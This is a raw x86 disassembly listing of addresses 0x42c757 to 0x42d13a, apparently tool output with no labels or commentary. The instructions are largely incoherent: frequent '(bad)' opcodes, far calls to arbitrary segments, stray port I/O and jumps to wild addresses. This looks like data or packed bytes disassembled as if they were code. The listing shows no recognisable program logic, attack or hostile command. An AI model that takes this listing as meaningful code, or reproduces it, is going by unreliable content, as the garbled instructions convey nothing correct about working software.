  42c757:	in     al,dx
  42c758:	xor    eax,DWORD PTR [edi-0x5ed71b38]
  42c75e:	or     eax,0xba4effe9
  42c763:	dec    esp
  42c764:	dec    eax
  42c765:	pushw  cs
  42c767:	inc    eax
  42c768:	sub    eax,0x2cf479c1
  42c76d:	rol    DWORD PTR [ecx+0xc5622f7],0xe7
  42c774:	push   DWORD PTR [ebx+0x2d]
  42c777:	out    dx,al
  42c778:	mov    esi,0xbeedfe74
  42c77d:	or     edx,DWORD PTR [eax+0xd00047f]
  42c783:	call   0x3e7:0x14fc3b
  42c78a:	or     eax,0xe8edbe0e
  42c78f:	mov    eax,0xfe0fd82c
  42c794:	call   0xab10799c
  42c799:	aas    
	...
  42c7b6:	add    BYTE PTR [eax],al
  42c7b8:	mov    eax,ds:0xd03e6fd
  42c7bd:	in     eax,0x7f
  42c7bf:	ror    DWORD PTR [eax-0x2c],0x40
  42c7c3:	add    al,0xd
  42c7c5:	add    BYTE PTR [esi-0xc],cl
  42c7c8:	dec    edi
  42c7c9:	cmp    ebx,DWORD PTR [ebp-0x5e]
  42c7cc:	or     eax,0xeece900
  42c7d1:	mov    ecx,0x8ad7a4
  42c7d6:	jmp    0x3a4279de
  42c7db:	out    dx,eax
  42c7dc:	add    ch,ch
  42c7de:	test   al,0x3
  42c7e0:	mov    bl,al
  42c7e2:	pop    esi
  42c7e3:	aas    
  42c7e4:	adc    eax,0xc686b17
  42c7e9:	add    cl,ch
  42c7eb:	dec    esi
  42c7ec:	lds    eax,FWORD PTR [ebx+eiz*2-0x16fff394]
  42c7f3:	sbb    al,0xd8
  42c7f5:	add    edi,DWORD PTR [esi+edx*1-0x76]
  42c7f9:	ror    esi,0x89
  42c7fc:	mov    cl,0xfe
  42c7fe:	call   0x21a5406
  42c803:	add    eax,0x275a000d
  42c808:	mov    DWORD PTR [esp+edx*2+0x39da7307],esi
  42c80f:	fstp   DWORD PTR [eax]
  42c811:	fdiv   st,st(6)
  42c813:	inc    ebx
  42c814:	or     eax,0x44ff1a8
  42c819:	or     eax,0x8aa9
	...
  42c83a:	(bad)  
  42c83b:	addr16 add al,ch
  42c83e:	push   cs
  42c83f:	add    BYTE PTR [ecx-0x9599],cl
  42c845:	call   0xe8af45e1
  42c84a:	push   cs
  42c84b:	add    BYTE PTR [edi+0x17d8d52c],al
  42c851:	(bad)  
  42c852:	jmp    0x42c85b
  42c854:	xchg   DWORD PTR [edx*1+0xe118a87],esi
  42c85b:	add    BYTE PTR [eax],al
  42c85d:	pusha  
  42c85e:	je     0x42c8bb
  42c860:	add    ecx,ebp
  42c862:	push   cs
  42c863:	xchg   DWORD PTR [edx+0xfd5],eax
  42c869:	jb     0x42c8a6
  42c86b:	add    al,0x5b
  42c86d:	mov    dl,0x47
  42c86f:	xchg   ecx,eax
  42c870:	or     cl,ch
  42c872:	cmp    edi,DWORD PTR [ecx-0x14]
  42c875:	cwde   
  42c876:	sbb    DWORD PTR [esi],ebp
  42c878:	push   ebx
  42c879:	jb     0x42c83e
  42c87b:	jmp    0x42c803
  42c87d:	cmp    DWORD PTR [edi+0xeeb01d4],ecx
  42c883:	add    BYTE PTR [ecx+edi*8-0x71],dh
  42c887:	aam    0x3
  42c889:	jmp    0x42c899
  42c88b:	add    BYTE PTR [ecx+eiz*8-0x71],dh
  42c88f:	aam    0x4
  42c891:	jmp    0x42c8a1
  42c893:	add    BYTE PTR [ebp-0x63],dh
  42c896:	mov    al,0xd1
  42c898:	cli    
  42c899:	je     0x42c8a1
  42c89b:	aad    0x15
  42c89d:	sbb    DWORD PTR [eax],eax
	...
  42c8bb:	add    BYTE PTR [edx],ah
  42c8bd:	adc    BYTE PTR [eax],al
  42c8bf:	(bad)  
  42c8c0:	(bad)  
  42c8c1:	pop    ss
  42c8c2:	call   0x2255:0x859
  42c8c9:	sti    
  42c8ca:	mov    dl,0x24
  42c8cc:	stc    
  42c8cd:	jl     0x42c914
  42c8cf:	int    0x21
  42c8d1:	data16 fs add bl,bl
  42c8d5:	jle    0x42c896
  42c8d7:	push   0xffffffe6
  42c8d9:	(bad)  
  42c8da:	loopne 0x42c8ec
  42c8dc:	out    dx,eax
  42c8dd:	les    edx,FWORD PTR [eax+0x53]
  42c8e0:	dec    esi
  42c8e1:	and    eax,0xb6bc75f7
  42c8e6:	adc    eax,0x43c164
  42c8eb:	test   DWORD PTR [eax+esi*1+0x14],esp
  42c8ef:	sbb    DWORD PTR [ecx],0xffffffa8
  42c8f2:	cli    
  42c8f3:	push   cs
  42c8f4:	xor    ch,cl
  42c8f6:	add    BYTE PTR [eax],al
  42c8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8f9:	cmp    BYTE PTR [ebp-0x4],0xa0
  42c8fd:	push   es
  42c8fe:	test   BYTE PTR [edi],cl
  42c900:	jne    0x42c905
  42c902:	add    BYTE PTR [ecx+0x1348a],cl
  42c908:	fs push es
  42c90a:	scas   eax,DWORD PTR es:[edi]
  42c90b:	pop    ebp
  42c90c:	je     0x42c914
  42c90e:	scas   eax,DWORD PTR es:[edi]
  42c90f:	(bad)  
  42c910:	out    dx,eax
  42c911:	call   0x3f6dd01
  42c916:	shl    eax,0x34
  42c919:	cli    
  42c91a:	mov    edx,0x8311b50
  42c91f:	mov    DWORD PTR [eax],eax
	...
  42c93d:	add    BYTE PTR [ecx-0x14df9d49],bl
  42c943:	xor    BYTE PTR [eax],cl
  42c945:	inc    DWORD PTR [ebx]
  42c947:	cs jnp 0x42c9c7
  42c94a:	xor    al,0x4
  42c94c:	jne    0x42c971
  42c94e:	mov    es,WORD PTR [ebx]
  42c950:	sub    al,al
  42c952:	lahf   
  42c953:	(bad)
  42c956:	mov    esi,0x91ff0003
  42c95b:	(bad)  
  42c95c:	push   es
  42c95d:	mov    bh,0x34
  42c95f:	adc    al,0xf7
  42c961:	jne    0x42c963
  42c963:	mov    dh,0x75
  42c965:	or     ah,bl
  42c967:	pop    edi
  42c968:	idiv   bh
  42c96a:	or     eax,0xa7e92fb6
  42c96f:	fdivr  st,st(7)
  42c971:	jmp    edx
  42c973:	or     edi,esp
  42c975:	cli    
  42c976:	pusha  
  42c977:	shl    edi,1
  42c979:	push   esp
  42c97a:	rcl    DWORD PTR [ebp-0x4eaf762e],cl
  42c980:	jle    0x42c979
  42c982:	adc    eax,0xc1182d6
  42c987:	fcos   
  42c989:	or     cl,BYTE PTR [ecx+0xdffff83]
  42c98f:	pop    edx
  42c990:	(bad)  
  42c991:	(bad)  
  42c992:	adc    ebx,DWORD PTR [ebp-0x6f]
  42c995:	add    BYTE PTR ds:0xef77ed9,cl
  42c99b:	int    0x4a
  42c99d:	jg     0x42c925
  42c99f:	jecxz  0x42c9ec
  42c9a1:	push   ebp
	...
  42c9be:	add    BYTE PTR [eax],al
  42c9c0:	nop
  42c9c1:	xchg   ecx,eax
  42c9c2:	fnstcw WORD PTR [edi+0x74]
  42c9c5:	xlat   BYTE PTR ds:[ebx]
  42c9c6:	dec    edx
  42c9c7:	inc    esp
  42c9c8:	xor    BYTE PTR [eax-0x1],bh
  42c9cb:	dec    DWORD PTR ds:0xaf3d24b5
  42c9d1:	fdivr  st,st(7)
  42c9d3:	jmp    ecx
  42c9d5:	(bad)  
  42c9d6:	sbb    BYTE PTR [edi+0x73ffd90d],bl
  42c9dc:	cli    
  42c9dd:	fistp  DWORD PTR [edi+0x4bd90d00]
  42c9e3:	sub    al,bh
  42c9e5:	inc    ebx
  42c9e6:	(bad)  
  42c9e7:	dec    DWORD PTR ds:0xcae95b6c
  42c9ed:	xlat   BYTE PTR ds:[ebx]
  42c9ee:	(bad)  
  42c9ef:	call   DWORD PTR [esi+0xc6607a3]
  42c9f5:	jae    0x42c9f6
  42c9f7:	gs or  eax,0x115d26a
  42c9fd:	mov    ah,0x3f
  42c9ff:	add    BYTE PTR [ebp+0x0],bl
  42ca02:	sar    DWORD PTR [ebx],1
  42ca04:	stc    
  42ca05:	int    0xda
  42ca07:	mov    DWORD PTR [eax-0x18],ecx
  42ca0a:	pop    ebp
  42ca0b:	aaa    
  42ca0c:	jmp    0x52671ede
  42ca11:	xlat   BYTE PTR ds:[ebx]
  42ca12:	cmp    al,0xd5
  42ca14:	(bad)  
  42ca15:	int    0xfc
  42ca17:	mov    ds:0x4ee9000d,al
  42ca1c:	adc    al,0x5a
  42ca1e:	jmp    0x1c10908c
  42ca23:	or     al,0x0
	...
  42ca41:	add    BYTE PTR [edx+0xda3dc23],dh
  42ca47:	add    cl,ch
  42ca49:	dec    esi
  42ca4a:	or     bl,BYTE PTR [edx-0x17]
  42ca4d:	imul   esp,DWORD PTR [edi+0x7a1793d9],0x1803e900
  42ca57:	jmp    0x42ca89
  42ca59:	fs jge 0x42ca5c
  42ca5c:	jmp    0xf262c335
  42ca61:	mov    WORD PTR [ebp+0x30],cs
  42ca64:	shl    ecx,1
  42ca66:	or     eax,0xe0d4e900
  42ca6b:	test   DWORD PTR [ecx-0x53],0xca9e2dc6
  42ca72:	fwait
  42ca73:	in     al,dx
  42ca74:	call   0xe943728f
  42ca79:	add    edx,DWORD PTR [esi]
  42ca7b:	test   BYTE PTR [ebx],bh
  42ca7d:	add    al,0xd
  42ca7f:	add    ah,ah
  42ca81:	mov    ds:0xe8e9000d,al
  42ca86:	mov    WORD PTR [ebx],cs
  42ca88:	inc    esi
  42ca89:	add    al,0xd
  42ca8b:	add    BYTE PTR [ebp-0x165d1f8a],dl
  42ca91:	add    ecx,DWORD PTR ds:0xdaf64fd
  42ca97:	add    BYTE PTR [eax],al
  42ca99:	jmp    0xe94369c1
  42ca9e:	push   cs
  42ca9f:	push   ebx
  42caa0:	retf   0x4372
  42caa3:	clc    
  42caa4:	gs call 0x42caaa
	...
  42cac2:	add    BYTE PTR [eax],al
  42cac4:	fst    DWORD PTR [edx+0x10]
  42cac7:	inc    ebx
  42cac8:	adc    DWORD PTR ds:0xf3d2f4fb,edi
  42cace:	aas    
  42cacf:	jmp    0xc306a2f2
  42cad4:	mov    ecx,0x237ce7c8
  42cad9:	outs   dx,BYTE PTR ds:[esi]
  42cada:	add    cl,ch
  42cadc:	push   cs
  42cadd:	stc    
  42cade:	test   dh,ah
  42cae0:	loope  0x42caaa
  42cae2:	sti    
  42cae3:	jb     0x42cad8
  42cae5:	sti    
  42cae6:	repnz sub ebp,ebp
  42cae9:	(bad)  
  42caea:	(bad)  
  42caeb:	jmp    0xcfee:0x419a540e
  42caf2:	add    cl,ch
  42caf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42caf5:	cmp    DWORD PTR [edi+0x72],0xde3a5417
  42cafc:	mov    BYTE PTR [esi],dh
  42cafe:	sti    
  42caff:	popaw  
  42cb01:	dec    esp
  42cb02:	idiv   eax
  42cb04:	fcomp  DWORD PTR [ebp+0x507a527f]
  42cb0a:	sbb    ch,BYTE PTR [edx+0x45]
  42cb0d:	repnz or ch,BYTE PTR [eax+ecx*1-0x37]
  42cb12:	sti    
  42cb13:	ds sti 
  42cb15:	ins    DWORD PTR es:[edi],dx
  42cb16:	add    cl,ch
  42cb18:	push   cs
  42cb19:	stc    
  42cb1a:	test   dl,ch
  42cb1c:	pop    ecx
  42cb1d:	enter  0x61fb,0x8e
  42cb21:	into   
  42cb22:	add    cl,ch
  42cb24:	daa    
  42cb25:	cmp    al,0xfb
  42cb27:	push   ss
	...
  42cb44:	add    BYTE PTR [eax],al
  42cb46:	inc    ecx
  42cb47:	or     bl,BYTE PTR [esi+0xb000ee9]
  42cb4d:	add    BYTE PTR [ecx+0x13fff6e2],ch
  42cb53:	(bad)  
  42cb54:	inc    DWORD PTR ss:[ebx]
  42cb57:	mov    al,0xb9
  42cb59:	push   ebx
  42cb5b:	(bad)  
  42cb5c:	(bad)  
  42cb5d:	cmp    al,0x86
  42cb5f:	add    al,0x0
  42cb61:	add    BYTE PTR [ecx-0x13],bl
  42cb64:	add    BYTE PTR [ebp-0x10],0x4a
  42cb68:	inc    eax
  42cb69:	and    al,0x8d
  42cb6b:	add    al,0x0
  42cb6d:	add    esp,esp
  42cb6f:	inc    BYTE PTR [ebx-0x8506cc9]
  42cb75:	and    eax,0xffffb4
  42cb7a:	jnp    0x42cb18
  42cb7c:	adc    eax,eax
  42cb7e:	leave  
  42cb7f:	scas   eax,DWORD PTR es:[edi]
  42cb80:	add    BYTE PTR [eax],al
  42cb82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb83:	clc    
  42cb84:	das    
  42cb85:	lock mov ah,0xff
  42cb88:	push   es
  42cb89:	mov    bh,0x74
  42cb8b:	stos   DWORD PTR es:[edi],eax
  42cb8c:	or     eax,0x4493d
  42cb91:	add    BYTE PTR [ebx+0x3ff1478],ah
  42cb97:	scas   eax,DWORD PTR es:[edi]
  42cb98:	add    ecx,0xa
  42cb9b:	jns    0x42cb5d
  42cb9d:	psubsb mm1,mm4
  42cba0:	idiv   bh
  42cba2:	rcl    DWORD PTR [ebp+0x33],cl
  42cba5:	shl    DWORD PTR [ebx+0x78],0xe7
  42cba9:	inc    BYTE PTR [eax]
	...
  42cbc7:	add    bl,dl
  42cbc9:	scas   al,BYTE PTR es:[edi]
  42cbca:	div    DWORD PTR [ebp+0x4]
  42cbcd:	scas   eax,DWORD PTR es:[edi]
  42cbce:	jne    0x42cbd8
  42cbd0:	ds cmp ch,cl
  42cbd3:	out    dx,al
  42cbd4:	add    ch,BYTE PTR [edi-0x2050aa09]
  42cbda:	jnp    0x42cbc8
  42cbdc:	push   eax
  42cbdd:	adc    cl,BYTE PTR [esi-0x75]
  42cbe0:	adc    al,0x4b
  42cbe2:	adc    BYTE PTR ds:0x94fb128a,cl
  42cbe9:	jl     0x42cbbe
  42cbeb:	(bad)  
  42cbec:	aam    0x40
  42cbee:	hlt    
  42cbef:	add    BYTE PTR ds:0x32653d9,cl
  42cbf5:	pushf  
  42cbf6:	test   DWORD PTR [eax],0x457aa879
  42cbfc:	sbb    eax,0x860c404e
  42cc01:	xchg   edx,eax
  42cc02:	xlat   BYTE PTR ds:[ebx]
  42cc03:	aas    
  42cc04:	out    0xb1,al
  42cc06:	into   
  42cc07:	jg     0x42cc71
  42cc09:	loope  0x42cbdc
  42cc0b:	repnz push eax
  42cc0d:	rol    DWORD PTR [ebx],1
  42cc0f:	je     0x42cc33
  42cc11:	das    
  42cc12:	add    eax,0xaac66253
  42cc17:	call   0xfc115a9e
  42cc1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc1d:	mov    dh,0x7a
  42cc1f:	add    BYTE PTR ds:0x94ffffd8,0x1b
  42cc26:	fdiv   DWORD PTR [edi]
  42cc28:	retf   0x8f3
  42cc2b:	mov    DWORD PTR [eax],eax
	...
  42cc49:	add    BYTE PTR [eax],bl
  42cc4b:	jge    0x42cc27
  42cc4d:	adc    BYTE PTR [edx],bh
  42cc4f:	xchg   DWORD PTR [edi-0x617fa479],edi
  42cc55:	test   al,0xd
  42cc57:	fsin   
  42cc59:	mov    dl,0x4d
  42cc5b:	dec    edi
  42cc5c:	dec    eax
  42cc5d:	in     al,0x86
  42cc5f:	mov    ds:0xe4d886ef,al
  42cc64:	jp     0x42ccc3
  42cc66:	adc    eax,0xc007760
  42cc6b:	fcos   
  42cc6d:	xchg   bl,cl
  42cc6f:	test   al,0x7a
  42cc71:	dec    ebp
  42cc72:	sbb    eax,0xc047760
  42cc77:	fcos   
  42cc79:	ss pop edx
  42cc7b:	push   ecx
  42cc7d:	xchg   DWORD PTR [edi-0x6bfc1703],esi
  42cc83:	sub    al,0x19
  42cc85:	xchg   BYTE PTR [eax+0x1157e7cf],ch
  42cc8b:	push   esi
  42cc8c:	call   0x2714dc6f
  42cc91:	pop    es
  42cc92:	xor    esi,0x750c9399
  42cc98:	sbb    ebx,ebx
  42cc9a:	jae    0x42cc34
  42cc9c:	jmp    0xcd6e50a4
  42cca1:	test   DWORD PTR [eax-0x24],esi
  42cca4:	or     DWORD PTR [eax+0x9],ebx
  42cca7:	push   esi
  42cca8:	call   0xa714dc89
  42ccad:	inc    esp
	...
  42ccca:	add    BYTE PTR [eax],al
  42cccc:	pop    ecx
  42cccd:	not    BYTE PTR [ecx]
  42cccf:	xchg   esp,eax
  42ccd0:	adc    DWORD PTR [ebp-0x5d],esi
  42ccd3:	fcom   QWORD PTR [edi-0x68]
  42ccd6:	jmp    0x916e50de
  42ccdb:	test   DWORD PTR [eax],ebp
  42ccdd:	fdiv   st,st(1)
  42ccdf:	push   edi
  42cce0:	adc    DWORD PTR [esi-0x18],edx
  42cce3:	fmul   QWORD PTR [edi]
  42cce5:	shl    BYTE PTR [esi+0x19f61ef4],cl
  42cceb:	xchg   esp,eax
  42ccec:	xchg   ebx,eax
  42cced:	jbe    0x42cc9a
  42ccef:	fdivr  QWORD PTR [ebx]
  42ccf1:	cwde   
  42ccf2:	jmp    0xd98556fa
  42ccf7:	sar    BYTE PTR [ebp+0xd03e804],1
  42ccfd:	jnp    0x42ccb3
  42ccff:	retf   
  42cd00:	xchg   ax,ax
  42cd02:	jmp    0xbf42da09
  42cd07:	addr16 mov ah,0xd7
  42cd0a:	dec    eax
  42cd0b:	jle    0x42cd63
  42cd0d:	leave  
  42cd0e:	outs   dx,BYTE PTR ds:[esi]
  42cd0f:	int3   
  42cd10:	xchg   edx,eax
  42cd11:	inc    ebx
  42cd12:	add    BYTE PTR [ecx],dh
  42cd14:	mov    al,al
  42cd16:	repnz pusha 
  42cd18:	retf   0x7fcb
  42cd1b:	and    DWORD PTR [ecx*2+0x2d3e9334],eax
  42cd22:	sti    
  42cd23:	cld    
  42cd24:	and    dh,ah
  42cd26:	aas    
  42cd27:	jmp    0xe942cda3
  42cd2c:	into   
  42cd2d:	push   ebx
  42cd2e:	and    al,0x40
	...
  42cd4c:	add    BYTE PTR [eax],al
  42cd4e:	adc    DWORD PTR [eax],eax
  42cd50:	shr    cl,0x81
  42cd53:	mov    al,0x1f
  42cd55:	sbb    BYTE PTR [eax],cl
  42cd57:	scas   eax,DWORD PTR es:[edi]
  42cd58:	je     0x42cd58
  42cd5a:	xchg   edi,eax
  42cd5b:	(bad)  
  42cd5c:	jmp    esp
  42cd5e:	mov    ss,WORD PTR [edx+0x10]
  42cd61:	ds mov esp,0x4efaeff2
  42cd67:	add    BYTE PTR [ebp-0x76fcc557],al
  42cd6d:	and    al,0xdd
  42cd6f:	cmp    al,0x6c
  42cd72:	fst    QWORD PTR [ebx+0x2d]
  42cd75:	push   ss
  42cd76:	(bad)  
  42cd78:	mov    ds:0x40980ee9,eax
  42cd7d:	adc    eax,0x9d7d10f0
  42cd82:	cmp    dh,bl
  42cd84:	gs jmp 0x7d58925f
  42cd8a:	call   0x62:0xe130008
  42cd91:	sbb    DWORD PTR [eax],eax
  42cd93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd94:	call   0xfc0714e8
  42cd99:	cs retf 
  42cd9b:	mov    DWORD PTR [ecx],0xe7000ee9
  42cda1:	lods   eax,DWORD PTR ds:[esi]
  42cda2:	loope  0x42cdce
  42cda4:	hlt    
  42cda5:	fs test eax,0x77003d53
  42cdab:	scas   eax,DWORD PTR es:[edi]
  42cdac:	adc    eax,0x3c60e0
  42cdb1:	test   DWORD PTR [eax],eax
	...
  42cdcf:	add    ah,dh
  42cdd1:	xor    BYTE PTR [eax*4+0x3b0230eb],bl
  42cdd8:	retf   
  42cdd9:	xor    dh,bh
  42cddb:	cmc    
  42cddc:	jno    0x42cdbe
  42cdde:	push   DWORD PTR [ebx+0x2a]
  42cde1:	inc    ebp
  42cde2:	pop    ebp
  42cde3:	cld    
  42cde4:	repz inc ecx
  42cde6:	clc    
  42cde7:	add    DWORD PTR [esp+edi*8],esp
  42cdea:	dec    DWORD PTR [edx-0x7ef15bf1]
  42cdf0:	jns    0x42cdbd
  42cdf2:	add    BYTE PTR [eax+0xd7403e4],al
  42cdf8:	pop    esi
  42cdf9:	std    
  42cdfa:	popa   
  42cdfb:	add    BYTE PTR [esi],bh
  42cdfd:	cld    
  42cdfe:	sub    bl,bl
  42ce00:	int3   
  42ce01:	or     eax,0x79cbfff9
  42ce06:	test   DWORD PTR [edi],0x10760
  42ce0c:	mov    ah,0x80
  42ce0e:	inc    ebp
  42ce0f:	test   al,0x24
  42ce11:	movsx  eax,WORD PTR [ebp-0x74]
  42ce15:	lock (bad) 
  42ce17:	jmp    DWORD PTR [esi+esi*4+0x43a7f415]
  42ce1e:	add    BYTE PTR [ebp+0x357fc774],al
  42ce24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce25:	add    eax,DWORD PTR [eax]
  42ce27:	psrlq  mm2,QWORD PTR [eax]
  42ce2a:	adc    BYTE PTR [edi],cl
  42ce2c:	inc    ebx
  42ce2d:	cmp    DWORD PTR [ecx+eax*8],ecx
  42ce30:	xchg   edi,eax
  42ce31:	int3   
  42ce32:	add    bl,al
	...
  42ce50:	add    BYTE PTR [eax],al
  42ce52:	out    0x30,eax
  42ce54:	clc    
  42ce55:	add    DWORD PTR [ecx+0x1e],edx
  42ce58:	dec    edi
  42ce59:	call   0x43709c
  42ce5e:	or     eax,0x11742481
  42ce63:	(bad)  
  42ce64:	(bad)  
  42ce65:	out    0xf1,eax
  42ce67:	push   ecx
  42ce68:	dec    ecx
  42ce69:	adc    dh,dh
  42ce6b:	fwait
  42ce6c:	mov    edi,0x77117a0b
  42ce71:	inc    ebp
  42ce72:	or     DWORD PTR [edx],eax
  42ce74:	dec    ecx
  42ce75:	mov    esp,0xaf3f64c
  42ce7a:	bound  ebx,QWORD PTR [ecx]
  42ce7c:	div    edi
  42ce7e:	fidiv  DWORD PTR ss:[esi+0x7d]
  42ce82:	add    eax,0xdf0515a
  42ce87:	inc    ebp
  42ce88:	std    
  42ce89:	dec    esi
  42ce8a:	bound  esi,QWORD PTR [ecx-0x5c]
  42ce8d:	add    BYTE PTR ds:0xf0157d9,cl
  42ce93:	fcos   
  42ce95:	out    0x1f,al
  42ce97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce98:	dec    eax
  42ce99:	or     BYTE PTR [ecx],dl
  42ce9b:	sub    eax,0x413a4ef1
  42cea0:	sahf   
  42cea1:	add    BYTE PTR ds:0xcfe57d9,cl
  42cea7:	fcos   
  42cea9:	cli    
  42ceaa:	inc    eax
  42ceab:	rol    DWORD PTR [eax-0x35178abb],0x75
  42ceb2:	mov    ecx,0xe8c561
	...
  42ced3:	add    bh,ah
  42ced5:	mov    eax,ds:0xe38efbca
  42ceda:	fild   WORD PTR [eax]
  42cedc:	sbb    edi,ebx
  42cede:	cs push ebx
  42cee0:	and    eax,0xdffff3e
  42cee5:	icebp  
  42cee6:	add    bh,dh
  42cee8:	mov    bl,al
  42ceea:	(bad)  
  42ceeb:	push   cs
  42ceec:	jnp    0x42cf01
  42ceee:	cld    
  42ceef:	aas    
  42cef0:	add    DWORD PTR [esi+ebp*1-0x6f001aad],esi
  42cef7:	add    ecx,DWORD PTR ds:0x60fbd100
  42cefd:	(bad)  
  42cefe:	jmp    0x5d0aafd1
  42cf03:	dec    eax
  42cf04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf05:	das    
  42cf06:	inc    edx
  42cf07:	pop    eax
  42cf08:	dec    ecx
  42cf09:	jp     0x42cf2e
  42cf0b:	(bad)  [edx]
  42cf0d:	leave  
  42cf0e:	xor    cl,dh
  42cf10:	mov    edx,0xb9034144
  42cf15:	cmc    
  42cf16:	mov    ch,0x36
  42cf18:	mov    ch,0x9b
  42cf1a:	jmp    0xed9adc22
  42cf1f:	add    DWORD PTR ds:0x1cf0fe00,ecx
  42cf25:	cmp    al,0xf1
  42cf27:	repz jle 0x42cf0d
  42cf2a:	xchg   ebp,eax
  42cf2b:	ss jne 0x42cec9
  42cf2e:	jmp    0xe49adc36
  42cf33:	add    DWORD PTR ds:0x57e200,ecx
	...
  42cf55:	add    ch,ah
  42cf57:	jae    0x42cf7d
  42cf59:	pushf  
  42cf5a:	cmp    eax,0x92d05cc5
  42cf5f:	mov    esi,0xc5db90c1
  42cf64:	ret    0x50d6
  42cf67:	clc    
  42cf68:	out    0x57,eax
  42cf6a:	and    BYTE PTR [ecx],dh
  42cf6c:	sbb    bl,BYTE PTR [ebp+ebp*2+0x0]
  42cf70:	jmp    0xe742f478
  42cf75:	add    ecx,DWORD PTR ds:0x90cc14c5
  42cf7b:	cmp    eax,DWORD PTR [ecx+0x34]
  42cf7e:	xchg   esi,eax
  42cf7f:	dec    ebx
  42cf80:	lea    edi,[ecx-0x31]
  42cf83:	fsub   DWORD PTR [eax-0x36]
  42cf86:	xchg   ch,al
  42cf88:	jb     0x42cfd1
  42cf8a:	adc    eax,0xee10000
  42cf8f:	add    BYTE PTR [esi+eax*8-0x2c],dh
  42cf93:	jmp    FWORD PTR ds:0xe8b9e429
  42cf99:	add    eax,0xe60000ab
  42cf9e:	xor    DWORD PTR [ebx],0xc079de14
  42cfa4:	dec    edi
  42cfa5:	sub    BYTE PTR [esi],ch
  42cfa7:	lock push es
  42cfa9:	xor    esi,edi
  42cfab:	push   edi
  42cfac:	push   es
  42cfad:	jmp    0x42cfbd
  42cfaf:	add    bl,bh
  42cfb1:	mov    ah,0x42
  42cfb3:	leave  
  42cfb4:	adc    eax,0x51c15
  42cfb9:	mov    esi,0x0
	...
  42cfd6:	add    BYTE PTR [eax],al
  42cfd8:	lock sub al,0xc9
  42cfdb:	sub    esp,DWORD PTR [ecx]
  42cfdd:	vpmulhuw ymm5,ymm1,ymm6
  42cfe1:	test   eax,0x4c12e93f
  42cfe6:	pop    ds
  42cfe7:	adc    DWORD PTR [ebx-0x3f],edi
  42cfea:	add    cl,ch
  42cfec:	xchg   edx,eax
  42cfed:	mov    edi,0xf375d374
  42cff2:	daa    
  42cff3:	lds    ecx,FWORD PTR [ebp+0x0]
  42cff6:	or     edx,DWORD PTR [esi-0x16ff0471]
  42cffc:	push   cs
  42cffd:	stc    
  42cffe:	mov    dl,0x60
  42d000:	push   cs
  42d001:	(bad)  
  42d002:	(bad)  
  42d003:	call   0xf253afd7
  42d008:	iret   
  42d009:	test   bl,bh
  42d00b:	or     al,0xe1
  42d00d:	jmp    0x42d04e
  42d00f:	jmp    0xc762caec
  42d014:	dec    ebp
  42d015:	add    BYTE PTR [edx*1-0x519b27ef],al
  42d01c:	push   cs
  42d01d:	add    BYTE PTR [ecx+ebp*4+0x87193a],al
  42d024:	cmp    BYTE PTR [eax],bl
  42d026:	add    al,0x85
  42d028:	mov    ah,0x2c
  42d02a:	sbb    ecx,DWORD PTR [ebx+0x43dbe871]
  42d030:	fs inc edi
  42d032:	mov    DWORD PTR [eax],eax
  42d034:	jne    0x42d036
  42d036:	add    BYTE PTR [ecx+0x280d475c],cl
	...
  42d058:	add    BYTE PTR [eax],al
  42d05a:	and    BYTE PTR [eax+0x0],al
  42d05d:	mov    ebp,ebp
  42d05f:	cld    
  42d060:	add    BYTE PTR [eax],al
  42d062:	xor    al,0x49
  42d064:	dec    eax
  42d065:	add    al,0x47
  42d067:	rol    BYTE PTR [eax-0x3e],0x28
  42d06b:	add    BYTE PTR [ebx],ch
  42d06d:	ror    bh,0xb9
  42d070:	mul    DWORD PTR ds:0x3bccd0
  42d076:	cli    
  42d077:	std    
  42d078:	pop    ds
  42d079:	fisub  WORD PTR [edi+0x0]
  42d07c:	add    al,0x74
  42d07e:	push   edx
  42d07f:	test   al,0x1d
  42d081:	(bad)  
  42d082:	hlt    
  42d083:	inc    DWORD PTR [ebx-0x5ee58740]
  42d089:	sub    BYTE PTR [eax],ah
  42d08b:	inc    eax
  42d08c:	add    BYTE PTR [ebx-0x76fbe470],cl
  42d092:	pop    esp
  42d093:	cld    
  42d094:	add    BYTE PTR [eax],al
  42d096:	hlt    
  42d097:	inc    edx
  42d098:	inc    esp
  42d099:	and    al,0xec
  42d09b:	inc    edx
  42d09c:	or     eax,0x3ba028
  42d0a1:	mov    DWORD PTR ds:0xb4000100,esi
  42d0a7:	jmp    0xfefb:0xc46640bf
  42d0ae:	or     esp,edi
  42d0b0:	adc    eax,DWORD PTR [eax-0x4c]
  42d0b3:	mov    cl,0x5
  42d0b5:	and    BYTE PTR [edx+0x3b],ah
  42d0b8:	add    BYTE PTR [ecx*1+0x532e06],al
	...
  42d0db:	add    BYTE PTR [ecx],bl
  42d0dd:	sbb    al,0xdc
  42d0df:	fst    QWORD PTR [ebx-0x27]
  42d0e2:	inc    DWORD PTR [ebx-0x78fc32b3]
  42d0e8:	fnstenv [edi+ebp*8-0x567184d2]
  42d0ef:	jne    0x42d0f1
  42d0f1:	xor    DWORD PTR [ecx],0x52
  42d0f4:	push   ds
  42d0f5:	xchg   BYTE PTR ds:[eax],bl
  42d0f8:	cmp    DWORD PTR [esi+0x2a02e7ff],edx
  42d0fe:	(bad)  
  42d0ff:	sti    
  42d100:	jmp    0xc6d9:0x9be2a9a
  42d107:	adc    eax,0x3fa80d
  42d10c:	(bad)  [ebp+0x7a]
  42d10f:	clc    
  42d110:	sub    al,ah
  42d112:	retf   
  42d113:	adc    al,0xcd
  42d115:	fmul   DWORD PTR [edx]
  42d117:	clc    
  42d118:	mov    al,ds:0xba5231d3
  42d11d:	std    
  42d11e:	scas   al,BYTE PTR es:[edi]
  42d11f:	das    
  42d120:	int    0xed
  42d122:	test   al,0x5b
  42d124:	arpl   WORD PTR [esi-0x5a1ada3a],bx
  42d12a:	aas    
  42d12b:	add    bl,bh
  42d12d:	fistp  DWORD PTR [edi]
  42d12f:	fimul  DWORD PTR [esi-0x27]
  42d132:	sti    
  42d133:	jae    0x42d181
  42d135:	mov    cl,0x81
  42d137:	ret    0xd90d
  42d13a:	jnp    0x42d0fc
